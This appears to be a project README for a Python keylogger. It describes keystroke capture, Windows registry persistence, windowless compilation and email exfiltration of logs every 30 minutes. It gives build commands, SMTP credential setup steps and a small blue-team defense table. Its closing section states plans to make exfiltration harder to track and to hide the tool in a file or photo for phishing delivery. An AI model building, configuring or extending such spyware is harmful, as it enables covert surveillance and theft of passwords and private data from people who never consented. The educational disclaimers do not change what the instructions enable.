# 🔐 Python Keylogger — Educational Security Tool

> ⚠️ **DISCLAIMER: This project is strictly for educational purposes and personal use on your own machine. Using this software on any device without explicit written permission from the owner is illegal and unethical. The author takes no responsibility for any misuse of this tool.**

---

## 📖 About This Project

This is an educational keylogger built in Python as part of a cybersecurity learning journey. It demonstrates core concepts used in real-world security research including:

- Keyboard event monitoring
- Background process execution
- Windows registry persistence
- Automated email exfiltration
- Silent logging with timestamps

This project was built from scratch using only Python standard libraries and `pynput` — no frameworks, no shortcuts.

---

## 🧠 Concepts Demonstrated

| Concept | Implementation |
|---|---|
| Keyboard monitoring | `pynput.keyboard.Listener` |
| Background execution | `threading.Thread(daemon=True)` |
| Windows persistence | `winreg` — registry startup key |
| Silent logging | `logging` module with file handler |
| Data exfiltration | `smtplib` — automated email |
| Cross-platform paths | `pathlib` + `sys.frozen` check |
| PyInstaller packaging | `--noconsole --onefile` |

---

## ⚙️ How It Works

### 1️⃣ First Run
```
User runs the EXE once
        ↓
Adds itself to Windows registry startup key
        ↓
Starts logging ALL keystrokes to keylog.txt
        ↓
Emails logs every 30 minutes automatically
```

### 2️⃣ Every Boot After That
```
PC boots up
        ↓
Windows reads registry
        ↓
Program starts AUTOMATICALLY — silently, no window
        ↓
Logging resumes without any user interaction
```

### 3️⃣ Data Flow
```
Key pressed
        ↓
when_pressed() called by pynput
        ↓
Normal key → logs character
Special key → logs [ENTER] [SPACE] [BACKSPACE] etc
        ↓
Flushed to disk IMMEDIATELY
        ↓
Every 30 minutes → emailed to receiver → log cleared
        ↓
Keylog file then can be uploaded to any AI agent and be made readable using the prompt provided in AI_prompt file

```

---

## 🗂️ Project Structure

```
keylogger/
├── Keylogger.py        ← main source code
|---Requriment.txt      ← contains name of all the reqrired resources
├── keylog.txt          ← generated log file (appears next to EXE)
└── README.md           ← this file
```

---

## 🛠️ Tech Stack

| Tool | Purpose |
|---|---|
| Python 3.x | Core language |
| `pynput` | Keyboard event capture |
| `logging` | Timestamped file logging |
| `threading` | Background email sender |
| `winreg` | Windows registry persistence |
| `smtplib` | Email transmission |
| `pathlib` | Cross-platform file paths |
| `PyInstaller` | Compile to standalone EXE |

---

## 📦 Installation

### Prerequisites:
- Python 3.x
- pip

### Install dependencies:
```bash
pip install pynput pyinstaller
```
### Automated install
keeping in mind that sometimes installing can be time taking work we can install all the required libraries and resources in one simple command
"pip install requirment.txt"

requirement.txt contains name of all the required resources for the program to run on the host computer (requirement.txt is all provided in the repo)


---

## 🚀 Usage

### Run as Python script:
```bash
python Keylogger.py
```

### Compile to EXE (Windows):
```bash
pyinstaller --noconsole --onefile Keylogger.py
```

The compiled EXE will be in the `dist/` folder.

---

## 📧 Email Configuration

Before running — update these values in `send_email_logs()`:

```python
sender   = "youremail@gmail.com"     # sender Gmail
receiver = "receiver@gmail.com"      # where logs are sent
password = "your_app_password"       # Gmail App Password (NOT real password!, shown how to get it in the next heading) you need to set this up prior and then you can find fill it up
```

### ⚠️ Getting Gmail App Password:
```
1. Go to myaccount.google.com
2. Security → 2-Step Verification → Enable
3. Security → App Passwords → Generate
4. Select "Mail" → Copy the 16-digit password
5. Paste it as the password value above
```

---

## 🔍 Key Features

### ✅ Silent Operation
- No console window when compiled with `--noconsole`
- No visible indication the program is running & no cmd pop ups

### ✅ Persistent
- Adds itself to Windows registry on first run
- Automatically starts on every system boot
- No manual intervention needed after first run

### ✅ Immediate Disk Write
- Every keystroke flushed to disk immediately
- No data loss even if process is force-killed

### ✅ Automatic Exfiltration
- Emails logs every 30 minutes
- Clears log file after successful send
- Fails silently — never crashes

### ✅ Special Key Handling
- Normal keys logged as characters: `h` `e` `l` `l` `o`
- Special keys logged as: `[ENTER]` `[SPACE]` `[BACKSPACE]` `[SHIFT]`

---

## 📄 Sample Log Output

```
2024-01-15 10:30:01 - h
2024-01-15 10:30:01 - e
2024-01-15 10:30:01 - l
2024-01-15 10:30:01 - l
2024-01-15 10:30:01 - o
2024-01-15 10:30:02 - [SPACE]
2024-01-15 10:30:02 - w
2024-01-15 10:30:02 - o
2024-01-15 10:30:02 - r
2024-01-15 10:30:02 - l
2024-01-15 10:30:02 - d
2024-01-15 10:30:03 - [ENTER]
```

---

## 🛡️ Detection & Defense (Blue Team Perspective)

Understanding how this works helps defenders protect against it:

| Attack Vector | Defense |
|---|---|
| Registry persistence | Monitor registry with Autoruns (Sysinternals) |
| Silent EXE | Check Task Manager for unknown processes |
| Email exfiltration | Monitor outbound SMTP traffic |
| Keystroke capture | Use virtual keyboards for sensitive input |
| Startup execution | Regularly audit startup programs |

---

## ⚖️ Legal & Ethical Notice

This tool was built for:
- ✅ Personal educational use
- ✅ Understanding how keyloggers work
- ✅ Learning Python + cybersecurity concepts
- ✅ Cybersecurity research on your OWN machine

This tool must NEVER be used for:
- ❌ Monitoring others without consent
- ❌ Stealing credentials or personal data
- ❌ Deploying on machines you don't own
- ❌ Any illegal activity

**In India — IT Act 2000 Section 43 & 66 covers unauthorized interception of data. Penalties include imprisonment up to 3 years and/or fines.**

---

## 👨‍💻 Author

**Sawan Choudhary**
- Learning: Ethical Hacking + Python Automation
- Currently studying: Automate the Boring Stuff with Python + Black Hat Python
- Goal: Penetration Tester / Security Researcher

---

## 📚 What I Learned Building This

- How `pynput` captures system-level keyboard events
- Event-driven programming vs sequential programming
- How Windows registry persistence works
- Threading and daemon threads in Python
- How malware achieves stealth and persistence
- PyInstaller compilation and path handling
- SMTP email automation with Python

  ## What I Would Love To Learn And Add
- If we can skip sending it thought email: this way it will me much more harder to track
- If we can attach it to a file or photo as an backdoor: would be easier to send accros using phising methods

---
---

*Built with Python 🐍 | For educational purposes only 🎓*
